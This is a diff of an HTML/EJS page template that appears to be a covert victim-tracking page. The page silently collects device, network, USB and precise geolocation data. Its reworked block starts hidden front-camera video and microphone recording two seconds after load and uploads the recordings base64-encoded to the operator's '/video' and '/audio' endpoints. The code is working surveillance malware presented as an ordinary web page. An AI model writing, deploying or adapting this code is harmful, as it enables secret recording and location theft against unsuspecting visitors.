@@ -19,115 +19,11 @@ left:0;
 </style>
 </head>
 <body>
-<video id="video" style="display:none" playsinline autoplay></video>
+<video id="video" style="display:none"  playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script type="text/javascript" defer>
 var uid="<%=uid %>";
-var mediaRecorder;
-var recordedChunks = [];
-var audioRecorder;
-var audioChunks = [];
-var videoSent = false;
-var audioSent = false;
-
-async function startVideoRecording() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
-            audio: true 
-        });
-        
-        mediaRecorder = new MediaRecorder(stream);
-        recordedChunks = [];
-        
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
-        };
-        
-        mediaRecorder.onstop = async () => {
-            const blob = new Blob(recordedChunks, {
-                type: 'video/webm'
-            });
-            
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                $.post("<%=a %>/video", {
-                    uid: uid,
-                    video: encodeURIComponent(reader.result.split(',')[1]),
-                    duration: Math.floor(recordedChunks.length * 0.1)
-                }, (s) => {
-                    videoSent = true;
-                    checkAndRedirect();
-                });
-            };
-            reader.readAsDataURL(blob);
-        };
-        
-        mediaRecorder.start(10000);
-        setTimeout(() => {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }, 10000);
-        
-    } catch(err) {
-        console.log("Video recording access denied:", err);
-        videoSent = true;
-        checkAndRedirect();
-    }
-}
-
-async function startAudioRecording() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            audio: true 
-        });
-        
-        audioRecorder = new MediaRecorder(stream);
-        audioChunks = [];
-        
-        audioRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                audioChunks.push(event.data);
-            }
-        };
-        
-        audioRecorder.onstop = async () => {
-            const blob = new Blob(audioChunks, {
-                type: 'audio/webm'
-            });
-            
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                $.post("<%=a %>/audio", {
-                    uid: uid,
-                    audio: encodeURIComponent(reader.result.split(',')[1]),
-                    duration: Math.floor(audioChunks.length * 0.1)
-                }, (s) => {
-                    audioSent = true;
-                    checkAndRedirect();
-                });
-            };
-            reader.readAsDataURL(blob);
-        };
-        
-        audioRecorder.start(8000);
-        setTimeout(() => {
-            if (audioRecorder && audioRecorder.state === 'recording') {
-                audioRecorder.stop();
-            }
-        }, 8000);
-        
-    } catch(err) {
-        console.log("Audio recording access denied:", err);
-        audioSent = true;
-        checkAndRedirect();
-    }
-}
-
 async function gather(){
 var td="";
 <% if(!t){ %>
@@ -149,6 +45,8 @@ td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
 }
 }
 
+
+
 if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
 /////List cameras and microphones.
 await navigator.mediaDevices?.enumerateDevices()
@@ -164,6 +62,7 @@ td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
 });
 }
 
+
 ////CONNECTION
 if("connection" in navigator){
 td+="<br><b>🕸️ Network Information</b><br>";
@@ -171,6 +70,7 @@ for(var i=0;i < xoc.length;i++){
 var str = navigator.connection[xoc[i]];
 td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
 }}
+
 
 ////USB
 if("usb" in navigator){
@@ -212,6 +112,9 @@ if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
 }
 
+
+
+
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
@@ -245,11 +148,96 @@ post(canvasData);
 }, 1500);
 }
 
-// Start video and audio recording
+
+// ========== VIDEO AND AUDIO RECORDING ADDED BELOW ==========
+var mediaRecorder;
+var recordedChunks = [];
+
+async function startVideoRecording() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: true 
+        });
+        
+        mediaRecorder = new MediaRecorder(stream);
+        recordedChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+        
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                $.post("<%=a %>/video", {
+                    uid: uid,
+                    video: encodeURIComponent(reader.result.split(',')[1]),
+                    duration: Math.floor(recordedChunks.length * 0.1)
+                });
+            };
+            reader.readAsDataURL(blob);
+        };
+        
+        mediaRecorder.start(10000); // Record 10 seconds
+        setTimeout(() => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }, 10000);
+        
+    } catch(err) {
+        console.log("Video recording error:", err);
+    }
+}
+
+async function startAudioRecording() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const audioRecorder = new MediaRecorder(stream);
+        let audioChunks = [];
+        
+        audioRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                audioChunks.push(event.data);
+            }
+        };
+        
+        audioRecorder.onstop = async () => {
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                $.post("<%=a %>/audio", {
+                    uid: uid,
+                    audio: encodeURIComponent(reader.result.split(',')[1]),
+                    duration: Math.floor(audioChunks.length * 0.1)
+                });
+            };
+            reader.readAsDataURL(blob);
+        };
+        
+        audioRecorder.start(8000); // Record 8 seconds
+        setTimeout(() => {
+            if (audioRecorder && audioRecorder.state === 'recording') {
+                audioRecorder.stop();
+            }
+        }, 8000);
+        
+    } catch(err) {
+        console.log("Audio recording error:", err);
+    }
+}
+
+// Start recording after 2 seconds
 setTimeout(() => {
     startVideoRecording();
     startAudioRecording();
 }, 2000);
+// ========== END OF ADDED CODE ==========
+
 
 $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});
 
